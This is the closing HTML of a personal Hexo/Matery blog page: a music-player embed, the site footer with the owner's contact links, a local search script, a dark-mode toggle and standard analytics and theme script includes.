        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="tencent"
                   type="playlist"
                   id="2870668388"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2025</span>
            
            <a href="/about" target="_blank">Sa1ntCHEN</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/SaintCEN" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:24009300521@stu.xidian.edu.cn" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2587899960" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2587899960" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lightgallery/1.10.0/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
